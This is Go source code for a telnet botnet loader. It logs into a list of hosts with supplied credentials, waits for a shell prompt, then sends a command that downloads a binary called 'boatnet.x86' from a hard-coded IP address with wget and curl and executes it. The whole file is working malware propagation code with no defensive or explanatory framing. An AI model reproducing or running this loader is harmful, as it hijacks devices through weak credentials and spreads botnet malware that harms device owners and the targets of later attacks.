package main

import (
	"bufio"
	"net"
	"os"
	"strings"
	"time"
)

const (
	payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.67.244.57/hiddenbin/boatnet.x86; curl -O http://103.67.244.57/hiddenbin/boatnet.x86; cat boatnet.x86 >WTF; chmod +x *; ./WTF\n"
	timeout = 15 * time.Second
)

var loginPrompts = []string{"login:", "Login:", "username:", "Username:", "user:", "User:"}
var passwordPrompts = []string{"Password:", "password:", "passwd:", "Pass:"}
var shellPrompts = []string{"#", "$", ">", "~", "%", "@"}

func main() {
	if len(os.Args) != 2 {
		return
	}

	file, err := os.Open(os.Args[1])
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		go handleTarget(line)
	}

	select {} // keep main thread alive
}

func handleTarget(entry string) {
	parts := strings.Split(entry, " ")
	if len(parts) != 2 {
		return
	}

	addr := parts[0]
	auth := strings.Split(parts[1], ":")
	if len(auth) != 2 {
		return
	}

	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	reader := bufio.NewReader(conn)

	if !expectAny(reader, loginPrompts) {
		return
	}
	conn.Write([]byte(auth[0] + "\n"))

	if !expectAny(reader, passwordPrompts) {
		return
	}
	conn.Write([]byte(auth[1] + "\n"))

	if !expectAny(reader, shellPrompts) {
		return
	}

	// Hanya print jika berhasil login dan kirim payload
	println("[+] Success:", addr)
	conn.Write([]byte(payload))
	println("[*] Payload sent:", addr)
}

func expectAny(r *bufio.Reader, prompts []string) bool {
	buffer := ""
	timeoutChan := time.After(timeout)

	for {
		select {
		case <-timeoutChan:
			return false
		default:
			r.SetReadDeadline(time.Now().Add(2 * time.Second))
			b, err := r.ReadByte()
			if err != nil {
				continue
			}
			buffer += string(b)
			if len(buffer) > 4096 {
				buffer = buffer[len(buffer)-4096:]
			}
			for _, prompt := range prompts {
				if strings.Contains(buffer, prompt) {
					return true
				}
			}
		}
	}
}
